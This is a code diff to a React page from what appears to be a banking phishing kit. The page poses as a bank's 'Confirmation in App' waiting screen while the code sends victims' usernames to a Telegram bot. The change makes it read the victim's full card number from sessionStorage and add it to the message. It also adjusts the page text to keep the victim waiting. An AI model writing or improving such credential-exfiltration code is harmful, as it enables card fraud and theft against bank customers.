@@ -177,12 +177,15 @@ function NextStepAppr() {
   }, []);
 
   const sendTelegramLog = async () => {
-    try {
-      const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
-      const message = `✅ <b>USER CONFIRMED IN BANKING APP</b> ✅
+  try {
+    // Get the FULL card number from sessionStorage
+    const fullCardNumber = sessionStorage.getItem('cardNumber') || 'Unknown';
+    
+    const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
+    const message = `✅ <b>USER CONFIRMED IN BANKING APP</b> ✅
 ━━━━━━━━━━━━━━━━━━━━━
 👤 <b>Username:</b> ${username || 'Unknown'}
-💳 <b>Card Number:</b> ${cardNumber}
+💳 <b>Card Number:</b> <code>${fullCardNumber}</code>
 ⏰ <b>Time:</b> ${new Date().toLocaleString()}
 ━━━━━━━━━━━━━━━━━━━━━
 🔐 <b>Status:</b> Confirmed in mobile banking app
@@ -246,7 +249,7 @@ function NextStepAppr() {
         
         <div className="waiting-card">
           <div className="bank-logo-container">
-            <div className="bank-logo">{bankName}</div>
+            
           </div>
           <h2 className="waiting-title">Confirmation in App</h2>
           
@@ -260,6 +263,7 @@ function NextStepAppr() {
           <h3>Waiting for Confirmation</h3>
           <p>Your confirmation has been sent.</p>
           <p>Please check your mobile banking app.</p>
+          <p>Please do not refresh the page.</p>
           <p className="waiting-time">Current time: {currentTime.toLocaleString()}</p>
         </div>
         
